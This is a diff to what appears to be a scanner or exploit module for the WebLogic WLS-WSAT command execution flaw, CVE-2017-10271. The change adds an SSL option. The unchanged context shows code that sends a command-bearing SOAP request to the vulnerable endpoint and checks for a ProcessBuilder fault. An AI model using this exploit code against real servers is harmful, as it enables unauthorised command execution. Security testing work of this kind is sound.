@@ -13,6 +13,7 @@ headers = {
     'User-Agent': 'TestUA/1.0'
 }
 
+
 @universe.groups()
 class CVE_2017_10271(Star):
     info = {
@@ -22,7 +23,7 @@ class CVE_2017_10271(Star):
     }
     type = target_type.VULNERABILITY
 
-    def light_up(self, dip, dport, cmd='whoami', *args, **kwargs) -> (bool, dict):
+    def light_up(self, dip, dport, force_ssl=None, cmd='whoami', *args, **kwargs) -> (bool, dict):
         url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
         t_data = ''
         for i, c in enumerate(cmd.split()):
@@ -44,7 +45,7 @@ class CVE_2017_10271(Star):
       <soapenv:Body/>
     </soapenv:Envelope>
     '''.format(t_data)
-        res, data = http(url, 'POST', data=data, verify=False, timeout=3, headers=headers)
+        res, data = http(url, 'POST', data=data, timeout=3, headers=headers, ssl=force_ssl)
         if res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text):
             return True, {'msg': 'finish.'}
         return False, {'msg': 'finish.'}
